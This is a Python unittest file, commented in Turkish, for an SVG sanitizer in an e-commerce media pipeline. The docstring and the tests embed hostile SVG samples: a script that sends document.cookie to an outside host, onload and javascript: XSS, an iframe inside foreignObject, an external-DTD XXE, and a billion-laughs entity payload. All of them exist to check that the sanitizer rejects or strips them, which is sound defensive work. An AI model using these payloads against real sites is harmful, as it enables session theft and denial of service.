"""T-131 — SVG sanitize testleri.

Ana girdi `tradehub_core/tests/fixtures/malicious/script_payload.svg` (555 B, korpus
kaydı: `docs/reports/05-fixture-korpusu.md` satır 110, beklenen karar
`reject`). Dosya BEŞ ayrı saldırı taşıyor:

    <svg onload="alert(1)">                          olay işleyici
    <script>fetch("https://…"+document.cookie)</script>  veri sızdırma
    <image href="https://…/izleyici.png"/>            harici istek / iz sürme
    <foreignObject><iframe src="javascript:…">        HTML gömme
    <a xlink:href="javascript:alert(3)">              şema saldırısı

**Fixture'ın kendisi iyi biçimli XML DEĞİLDİR** — `xlink:` öneki
bildirilmemiş (`xmlns:xlink` yok), bu yüzden ayrıştırıcı `unbound prefix`
verir ve sanitize dosyayı `svg_not_well_formed` ile reddeder. Bu geçerli bir
karardır ama allowlist yolunu ÖLÇMEZ. Bu yüzden testler iki koldan gider:

    1. Fixture OLDUĞU GİBİ  → reddedilir (adım 3, iyi biçimlilik)
    2. Fixture + `xmlns:xlink` bildirimi → sanitize edilir, beş saldırının
       BEŞİ de kaldırılır (adım 5, allowlist)

İkinci kol fixture dosyasını DEĞİŞTİRMEZ, bellekte tek bir bildirim ekler;
saldırı yükünün tamamı gerçek fixture'dan gelir, elle yazılmamıştır.

Ayrıca gerçek dünya referansları ölçülür: `docs/standards/logo.md` §6.2 SVG-9
tablosundaki sekiz dosya, storefront deposunda DURUYOR ve bu testler onları
doğrudan okur — tavanların gerçekten iddia edilen dosyaları geçirdiği/
reddettiği ölçülür, varsayılmaz. Depo yoksa o testler atlanır.

Çalıştırma:

    python3 -m unittest discover -s /Users/ahmet/Desktop/istoc/tradehub_core/tests -v
"""

from __future__ import annotations

import base64
import json
import sys
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
FIXTURE = ROOT / "tradehub_core" / "tests" / "fixtures" / "malicious" / "script_payload.svg"
SLOT_DIR = ROOT / "tradehub_core" / "media" / "pipeline" / "policy" / "slots"

# Storefront SALT OKUNURDUR — yalnız ölçüm için okunur.
STOREFRONT = ROOT.parent / "tradehubfront"

if str(ROOT) not in sys.path:
	sys.path.insert(0, str(ROOT))

from tradehub_core.media.pipeline.security import svg  # noqa: E402

XLINK_BILDIRIMI = b'xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"'


def fixture_ham() -> bytes:
	return FIXTURE.read_bytes()


def fixture_iyi_bicimli() -> bytes:
	"""Fixture + `xmlns:xlink` bildirimi. Saldırı yükü DEĞİŞMEZ."""
	ham = fixture_ham()
	yeni = ham.replace(b'xmlns="http://www.w3.org/2000/svg"', XLINK_BILDIRIMI, 1)
	assert yeni != ham, "xmlns degistirilemedi — fixture degismis olabilir"
	return yeni


class FixtureKunyesi(unittest.TestCase):
	"""Fixture beklediğimiz saldırıları GERÇEKTEN taşıyor mu."""

	def test_fixture_var_ve_bes_saldiri_tasiyor(self):
		self.assertTrue(FIXTURE.is_file(), f"fixture yok: {FIXTURE}")
		ham = fixture_ham()
		for imza in (b"onload=", b"<script", b"<image", b"<foreignObject", b"javascript:"):
			self.assertIn(imza, ham, f"fixture {imza!r} tasimiyorr — test gecersiz")

	def test_fixture_boyutu_korpus_kaydiyla_uyusuyor(self):
		# docs/reports/05-fixture-korpusu.md satır 110: 555 B
		self.assertEqual(len(fixture_ham()), 555)


class HamFixtureReddi(unittest.TestCase):
	"""Kol 1 — fixture olduğu gibi: iyi biçimli değil, reddedilir."""

	def test_ham_fixture_reddedilir(self):
		sonuc = svg.sanitize(fixture_ham())
		self.assertFalse(sonuc.ok)
		self.assertEqual(sonuc.kod, svg.KOD_NOT_WELL_FORMED)

	def test_ret_durumunda_icerik_bos(self):
		"""`ok=False` ise yarım çıktı verilmez — çağıran yanlışlıkla yazamasın."""
		sonuc = svg.sanitize(fixture_ham())
		self.assertEqual(sonuc.content, b"")


class AllowlistTemizligi(unittest.TestCase):
	"""Kol 2 — iyi biçimli hâl: beş saldırının beşi de kaldırılır."""

	def setUp(self):
		self.sonuc = svg.sanitize(fixture_iyi_bicimli())

	def test_script_elementi_kaldirildi(self):
		self.assertEqual(self.sonuc.sayac.get("script"), 1)

	def test_onload_handleri_kaldirildi(self):
		self.assertEqual(self.sonuc.sayac.get("handler"), 1)
		adlar = {b.ad for b in self.sonuc.bulgular if b.tur == svg.TUR_ATTRIBUTE}
		self.assertIn("onload", adlar)

	def test_harici_referansli_elementler_kaldirildi(self):
		adlar = {b.ad for b in self.sonuc.bulgular if b.tur == svg.TUR_ELEMENT}
		self.assertIn("image", adlar)
		self.assertIn("foreignObject", adlar)

	def test_javascript_semali_a_elementi_kaldirildi(self):
		adlar = {b.ad for b in self.sonuc.bulgular if b.tur == svg.TUR_ELEMENT}
		self.assertIn("a", adlar)

	def test_foreignobject_alt_agaciyla_gider(self):
		"""`<iframe>` yalnız `<foreignObject>` içinde — ayrıca raporlanmaz.

		Elementi silip çocuklarını yukarı taşımak `<iframe>`'i kurtarırdı;
		bu test o davranışın YAPILMADIĞINI kilitler.
		"""
		adlar = [b.ad for b in self.sonuc.bulgular if b.tur == svg.TUR_ELEMENT]
		self.assertIn("foreignObject", adlar)
		self.assertNotIn("iframe", adlar)

	def test_geriye_cizim_kalmadigi_icin_reddedilir(self):
		"""Tek çizim (`<rect>`) `<a>` içindeydi; o silinince dosya boşalır."""
		self.assertFalse(self.sonuc.ok)
		self.assertEqual(self.sonuc.kod, svg.KOD_EMPTY_AFTER_SANITIZE)
		self.assertEqual(self.sonuc.mesaj_anahtari, "svg_empty_after_sanitize")

	def test_hicbir_saldiri_izi_ciktida_kalmadi(self):
		"""Ret olmasaydı bile çıktı temiz olurdu — ağaç üstünde doğrulanır."""
		import xml.etree.ElementTree as ET

		kok = ET.fromstring(fixture_iyi_bicimli())
		svg._temizle(kok, svg.DEFAULT_POLICY, [], {})
		metin = ET.tostring(kok, encoding="unicode").lower()
		# "http" TEK BAŞINA aranmaz: SVG'nin kendi namespace URI'si
		# (`http://www.w3.org/2000/svg`) meşru ve zorunludur. Aranan şey
		# fixture'ın saldırı hedefi: `ornek.gecersiz`.
		for iz in ("script", "onload", "foreignobject", "javascript:", "iframe", "ornek.gecersiz"):
			self.assertNotIn(iz, metin, f"cikti hala {iz!r} tasiyor")


class DtdVeEntity(unittest.TestCase):
	"""SVG-5 — XXE / billion laughs ayrıştırmadan ÖNCE reddedilir."""

	def test_doctype_reddedilir(self):
		icerik = (
			b'<?xml version="1.0"?><!DOCTYPE svg SYSTEM "http://kotu/x.dtd">'
			b'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1 1"><rect width="1" height="1"/></svg>'
		)
		sonuc = svg.sanitize(icerik)
		self.assertFalse(sonuc.ok)
		self.assertEqual(sonuc.kod, svg.KOD_DTD_FORBIDDEN)

	def test_entity_reddedilir(self):
		icerik = (
			b'<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY lol "lol">]>'
			b'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1 1"><rect width="1" height="1"/></svg>'
		)
		self.assertEqual(svg.sanitize(icerik).kod, svg.KOD_DTD_FORBIDDEN)

	def test_billion_laughs_ayristiriciya_HIC_verilmez(self):
		"""Ret ham bayt taramasında olur — bellek tüketilmeden.

		`parser` alanı `none` kalıyorsa ayrıştırıcı hiç çağrılmamış demektir;
		SVG-5'in "temizlemeye çalışmak yerine reddetmek doğru SIRADIR"
		gerekçesi tam olarak budur.
		"""
		icerik = (
			b'<!DOCTYPE lolz [<!ENTITY lol "lol">'
			b'<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]>'
			b'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1 1"><desc>&lol2;</desc></svg>'
		)
		sonuc = svg.sanitize(icerik)
		self.assertEqual(sonuc.kod, svg.KOD_DTD_FORBIDDEN)
		self.assertEqual(sonuc.parser, "none")

	def test_dtd_mesaj_anahtari_veri_dosyasindaki_anahtarla_esler(self):
		sonuc = svg.sanitize(b'<!DOCTYPE svg><svg xmlns="http://www.w3.org/2000/svg"/>')
		self.assertEqual(sonuc.mesaj_anahtari, "svg_dtd_forbidden")


class Svgz(unittest.TestCase):
	"""SVG-6 — `.svgz` sanitize edilmeden reddedilir."""

	def test_gzip_magic_reddedilir(self):
		sonuc = svg.sanitize(b"\x1f\x8b\x08\x00 gerisi onemsiz")
		self.assertFalse(sonuc.ok)
		self.assertEqual(sonuc.kod, svg.KOD_COMPRESSED)

	def test_politika_acikca_izin_verirse_gzip_kontrolu_atlanir(self):
		"""Bayrağın gerçekten bağlı olduğunu kilitler (ölü kod değil)."""
		pol = svg.DEFAULT_POLICY.with_(allow_svgz=True)
		sonuc = svg.sanitize(b"\x1f\x8b\x08\x00 gerisi onemsiz", policy=pol)
		self.assertNotEqual(sonuc.kod, svg.KOD_COMPRESSED)


class HrefKurali(unittest.TestCase):
	"""SVG-4 `href_rule` — yalnız `#…` ve yalnız `<use>` üzerinde."""

	GOVDE = (
		b'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"'
		b' viewBox="0 0 10 10"><defs><path id="p" d="M0 0 L10 10"/></defs>'
		b'{icerik}</svg>'
	)

	def _sanitize(self, icerik: bytes):
		return svg.sanitize(self.GOVDE.replace(b"{icerik}", icerik))

	def test_ayni_dosya_ici_referans_korunur(self):
		sonuc = self._sanitize(b'<use xlink:href="#p"/>')
		self.assertTrue(sonuc.ok, sonuc.kod)
		self.assertIn(b"#p", sonuc.content)

	def test_https_referansi_silinir(self):
		sonuc = self._sanitize(b'<use href="https://kotu.ornek/x.svg#p"/>')
		self.assertTrue(sonuc.ok, sonuc.kod)
		self.assertNotIn(b"kotu.ornek", sonuc.content)
		self.assertEqual(sonuc.sayac.get("href"), 1)

	def test_protokol_relatif_referans_silinir(self):
		sonuc = self._sanitize(b'<use href="//kotu.ornek/x.svg#p"/>')
		self.assertNotIn(b"kotu.ornek", sonuc.content)

	def test_goreli_yol_silinir(self):
		sonuc = self._sanitize(b'<use href="baska.svg#p"/>')
		self.assertNotIn(b"baska.svg", sonuc.content)

	def test_izinli_attribute_degerindeki_harici_url_silinir(self):
		"""`fill="url(https://…)"` allowlist'i geçer ama harici istek atar."""
		sonuc = self._sanitize(b'<rect width="10" height="10" fill="url(https://kotu.ornek/a)"/>')
		self.assertTrue(sonuc.ok, sonuc.kod)
		self.assertNotIn(b"kotu.ornek", sonuc.content)
		self.assertEqual(sonuc.sayac.get("external_value"), 1)

	def test_dosya_ici_url_referansi_korunur(self):
		"""`fill="url(#gradient)"` meşrudur — aşırı temizlik logoyu bozardı."""
		sonuc = self._sanitize(b'<rect width="10" height="10" fill="url(#p)"/>')
		self.assertIn(b"url(#p)", sonuc.content)


class GomuluFont(unittest.TestCase):
	"""Gömülü font yasağı — üç yoldan birden kapalı."""

	def test_svg_font_elementleri_silinir(self):
		icerik = (
			b'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10">'
			b'<defs><font id="f"><font-face font-family="Gizli"/>'
			b'<glyph unicode="A" d="M0 0"/></font></defs>'
			b'<rect width="10" height="10"/></svg>'
		)
		sonuc = svg.sanitize(icerik)
		self.assertTrue(sonuc.ok, sonuc.kod)
		self.assertGreaterEqual(sonuc.sayac.get("font", 0), 1)
		self.assertNotIn(b"font", sonuc.content)

	def test_style_elementindeki_font_face_silinir(self):
		icerik = (
			b'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10">'
			b'<style>@font-face{font-family:X;src:url(https://kotu/x.woff2)}</style>'
			b'<rect width="10" height="10"/></svg>'
		)
		sonuc = svg.sanitize(icerik)
		self.assertTrue(sonuc.ok, sonuc.kod)
		self.assertEqual(sonuc.sayac.get("style"), 1)
		self.assertNotIn(b"font-face", sonuc.content)
		self.assertNotIn(b"woff2", sonuc.content)

	def test_style_attributu_silinir(self):
		icerik = (
			b'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10">'
			b'<rect width="10" height="10" style="background:url(https://kotu/a)"/></svg>'
		)
		sonuc = svg.sanitize(icerik)
		self.assertNotIn(b"style", sonuc.content)
		self.assertNotIn(b"kotu", sonuc.content)


class Tavanlar(unittest.TestCase):
	"""SVG-9 — bayt / düğüm / viewBox tavanları."""

	def _svg(self, dugum: int) -> bytes:
		govde = b"".join(
			b'<path d="M0 0 L1 1"/>' for _ in range(max(0, dugum - 1))
		)
		return (
			b'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10">' + govde + b"</svg>"
		)

	def test_dugum_tavani_asilirsa_reddedilir(self):
		sonuc = svg.sanitize(self._svg(svg.DEFAULT_POLICY.max_nodes + 1))
		self.assertFalse(sonuc.ok)
		self.assertEqual(sonuc.kod, svg.KOD_TOO_COMPLEX)
		self.assertEqual(sonuc.mesaj_anahtari, "svg_too_complex")

	def test_dugum_tavani_tam_sinirda_gecer(self):
		sonuc = svg.sanitize(self._svg(svg.DEFAULT_POLICY.max_nodes))
		self.assertTrue(sonuc.ok, sonuc.kod)
		self.assertEqual(sonuc.node_count, svg.DEFAULT_POLICY.max_nodes)

	def test_viewbox_zorunlu(self):
		icerik = b'<svg xmlns="http://www.w3.org/2000/svg"><rect width="1" height="1"/></svg>'
		self.assertEqual(svg.sanitize(icerik).kod, svg.KOD_VIEWBOX_MISSING)

	def test_bayt_tavani_cikti_uzerinde_olculur(self):
		"""Tavan ÇIKTIDA ölçülür: sanitize çok şey silerse dosya geçebilir."""
		pol = svg.DEFAULT_POLICY.with_(max_bytes=400)
		sisman = (
			b'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10">'
			+ b"<metadata>" + b"x" * 5000 + b"</metadata>"
			+ b'<rect width="10" height="10"/></svg>'
		)
		sonuc = svg.sanitize(sisman, policy=pol)
		self.assertTrue(sonuc.ok, sonuc.kod)
		self.assertGreater(sonuc.bytes_in, 5000)
		self.assertLess(sonuc.bytes_out, 400)

	def test_girdi_tavani_ayristiriciyi_korur(self):
		"""`max_input_bytes` bu modülün EKLEDİĞİ savunma — bağlı olduğu kilitlenir."""
		pol = svg.DEFAULT_POLICY.with_(max_input_bytes=1000)
		sonuc = svg.sanitize(b'<svg xmlns="http://www.w3.org/2000/svg"/>' + b"<!-- -->" * 500, policy=pol)
		self.assertEqual(sonuc.kod, svg.KOD_INPUT_TOO_LARGE)
		self.assertEqual(sonuc.parser, "none")


class PolitikaKaynagi(unittest.TestCase):
	"""Sabitler slot JSON'undan okunuyor mu — iki liste ayrışmasın."""

	def test_slot_jsonundan_okunuyor(self):
		pol = svg.policy_yukle("brand-logo")
		self.assertEqual(pol.kaynak, "slot:brand-logo")

	def test_ayna_ile_slot_json_ayrismamis(self):
		"""`brand-logo.json` değişirse bu test düşer — kasıt budur."""
		pol = svg.policy_yukle("brand-logo")
		self.assertEqual(pol.allowed_elements, svg.DEFAULT_POLICY.allowed_elements)
		self.assertEqual(pol.allowed_attributes, svg.DEFAULT_POLICY.allowed_attributes)
		self.assertEqual(pol.max_bytes, svg.DEFAULT_POLICY.max_bytes)
		self.assertEqual(pol.max_nodes, svg.DEFAULT_POLICY.max_nodes)

	def test_seller_logo_ile_brand_logo_ayni_politika(self):
		"""`brand-logo.json` `identical_to` iddiası ÖLÇÜLÜR, varsayılmaz."""
		seller = SLOT_DIR / "seller-logo.json"
		if not seller.is_file():
			self.skipTest("seller-logo.json yok")
		a = svg.policy_yukle("brand-logo")
		b = svg.policy_yukle("seller-logo")
		self.assertEqual(a.allowed_elements, b.allowed_elements)
		self.assertEqual(a.allowed_attributes, b.allowed_attributes)
		self.assertEqual(a.max_bytes, b.max_bytes)
		self.assertEqual(a.max_nodes, b.max_nodes)

	def test_bozuk_json_aynaya_duser_ve_patlamaz(self):
		pol = svg.policy_yukle("boyle-bir-slot-yok")
		self.assertEqual(pol.kaynak, "ayna")
		self.assertEqual(pol.max_bytes, 32768)

	def test_svg_bugun_hala_iki_kapida_yasak(self):
		"""Bu modül kapıları AÇMAZ — SVG-1 kilidi yerinde mi.

		Sanitize'in varlığı, yükleme kapılarının açıldığı anlamına gelmemeli.
		Kapılar üretim kodundadır ve bu görevde DEĞİŞTİRİLMEDİ.
		"""
		guvenlik = (ROOT / "tradehub_core" / "utils" / "security.py").read_text(encoding="utf-8")
		politika = (ROOT / "tradehub_core" / "media" / "upload_policy.py").read_text(encoding="utf-8")
		self.assertIn('".svg"', guvenlik)
		self.assertIn('".svgz"', guvenlik)
		self.assertIn('b"<svg"', politika)

	def test_slot_politikasi_hala_kapali(self):
		veri = json.loads((SLOT_DIR / "brand-logo.json").read_text(encoding="utf-8"))
		blok = (veri.get("logo") or {}).get("svg_policy") or {}
		self.assertFalse(blok.get("enabled", False), "svg_policy.enabled acilmis — SVG-1 ihlali")


class DataUri(unittest.TestCase):
	"""SVG-10 — `data:` URI kanalı bugün denetlenebilir mi."""

	TEMIZ = (
		b'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10">'
		b'<rect width="10" height="10" fill="#0b57a4"/></svg>'
	)

	def test_base64_data_uri_cozulur_ve_sanitize_edilir(self):
		uri = "data:image/svg+xml;base64," + base64.b64encode(self.TEMIZ).decode()
		sonuc = svg.sanitize_data_uri(uri)
		self.assertTrue(sonuc.ok, sonuc.kod)
		self.assertGreater(sonuc.bytes_out, 0)

	def test_data_uri_icindeki_script_yakalanir(self):
		kotu = self.TEMIZ.replace(b"<rect", b'<script>alert(1)</script><rect', 1)
		uri = "data:image/svg+xml;base64," + base64.b64encode(kotu).decode()
		sonuc = svg.sanitize_data_uri(uri)
		self.assertEqual(sonuc.sayac.get("script"), 1)

	def test_yuzde_kodlu_data_uri_cozulur(self):
		from urllib.parse import quote

		uri = "data:image/svg+xml," + quote(self.TEMIZ)
		self.assertTrue(svg.sanitize_data_uri(uri).ok)

	def test_svg_olmayan_data_uri_reddedilir(self):
		sonuc = svg.sanitize_data_uri("data:image/png;base64,iVBORw0K")
		self.assertFalse(sonuc.ok)
		self.assertEqual(sonuc.kod, svg.KOD_NOT_SVG)


class GercekDosyalar(unittest.TestCase):
	"""`logo.md` §6.2 SVG-9 tablosundaki dosyalar ÖLÇÜLÜR, varsayılmaz."""

	GECER = (
		"src/assets/images/ta-logo.svg",
		"src/assets/images/amex.svg",
		"public/vite.svg",
	)
	KALIR = (
		"src/assets/images/svgviewer-output.svg",
		"src/assets/images/ta-shield-pattern.svg",
	)

	def setUp(self):
		if not STOREFRONT.is_dir():
			self.skipTest(f"storefront deposu yok: {STOREFRONT}")

	def test_gercek_logolar_gecer(self):
		for goreli in self.GECER:
			yol = STOREFRONT / goreli
			if not yol.is_file():
				continue
			with self.subTest(dosya=goreli):
				sonuc = svg.sanitize(yol.read_bytes())
				self.assertTrue(sonuc.ok, f"{goreli} reddedildi: {sonuc.kod}")

	def test_karsi_ornekler_bayt_tavaninda_reddedilir(self):
		for goreli in self.KALIR:
			yol = STOREFRONT / goreli
			if not yol.is_file():
				continue
			with self.subTest(dosya=goreli):
				sonuc = svg.sanitize(yol.read_bytes())
				self.assertFalse(sonuc.ok)
				self.assertEqual(sonuc.kod, svg.KOD_TOO_LARGE)

	def test_ikon_sprite_dugum_tavaninda_reddedilir(self):
		yol = STOREFRONT / "public/icons/ui.svg"
		if not yol.is_file():
			self.skipTest("ui.svg yok")
		sonuc = svg.sanitize(yol.read_bytes())
		self.assertFalse(sonuc.ok)
		self.assertEqual(sonuc.kod, svg.KOD_TOO_COMPLEX)
		self.assertGreater(sonuc.node_count, svg.DEFAULT_POLICY.max_nodes)


class Dayaniklilik(unittest.TestCase):
	"""Sanitize hiçbir girdide istisna FIRLATMAZ."""

	GIRDILER = (
		b"",
		b"   ",
		b"<svg",
		b"<svg></div>",
		b"\x00\x01\x02\x03",
		b'<?xml version="1.0"?>',
		b'<html><body><svg xmlns="http://www.w3.org/2000/svg"/></body></html>',
		b'<svg xmlns="http://ornek.gecersiz/baska" viewBox="0 0 1 1"/>',
		"<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1 1'><desc>şığüöç</desc></svg>".encode(),
	)

	def test_hicbir_girdide_istisna_yok(self):
		for girdi in self.GIRDILER:
			with self.subTest(girdi=girdi[:32]):
				sonuc = svg.sanitize(girdi)
				self.assertIsInstance(sonuc, svg.SvgSanitizeResult)
				self.assertIsInstance(sonuc.to_dict(), dict)

	def test_scan_icerik_uretmez_ama_ayni_karari_verir(self):
		ham = fixture_iyi_bicimli()
		s1 = svg.sanitize(ham)
		s2 = svg.scan(ham)
		self.assertEqual(s1.kod, s2.kod)
		self.assertEqual(s1.node_count, s2.node_count)
		self.assertEqual(s2.content, b"")

	def test_is_svg_ucuz_on_eleme(self):
		self.assertTrue(svg.is_svg(fixture_ham()))
		self.assertTrue(svg.is_svg(b'  \xef\xbb\xbf<svg xmlns="x"/>'))
		self.assertFalse(svg.is_svg(b"\x89PNG\r\n\x1a\n"))

	def test_sonuc_json_serilesebilir(self):
		"""`to_dict()` doğrudan log/metrik hattına gider — serileşmeli."""
		sonuc = svg.sanitize(fixture_iyi_bicimli())
		json.dumps(sonuc.to_dict())

	def test_defusedxml_durumu_sonucta_gorunur(self):
		"""Zayıf ayrıştırıcı sessiz kalmaz — `parser` alanı söyler."""
		sonuc = svg.sanitize(fixture_iyi_bicimli())
		self.assertIn(sonuc.parser, ("defusedxml", "stdlib"))
		self.assertEqual(sonuc.parser, "defusedxml" if svg.DEFUSEDXML_AVAILABLE else "stdlib")


class Serilestirme(unittest.TestCase):
	"""Çıktı geçerli SVG mi ve global durum kirletiliyor mu."""

	TEMIZ = (
		b'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">'
		b'<path d="M0 0 L24 24" stroke="#000" stroke-width="2"/></svg>'
	)

	def test_cikti_yeniden_ayristirilabilir(self):
		sonuc = svg.sanitize(self.TEMIZ)
		self.assertTrue(sonuc.ok)
		ikinci = svg.sanitize(sonuc.content)
		self.assertTrue(ikinci.ok, ikinci.kod)

	def test_sanitize_idempotent(self):
		"""Temiz bir dosya ikinci geçişte DEĞİŞMEZ."""
		bir = svg.sanitize(self.TEMIZ).content
		iki = svg.sanitize(bir).content
		self.assertEqual(bir, iki)

	def test_namespace_haritasi_geri_alinir(self):
		"""`register_namespace` GLOBAL — sanitize onu kalıcı kirletmemeli."""
		import xml.etree.ElementTree as ET

		onceki = dict(ET._namespace_map)
		svg.sanitize(self.TEMIZ)
		self.assertEqual(dict(ET._namespace_map), onceki)


if __name__ == "__main__":
	unittest.main(verbosity=2)
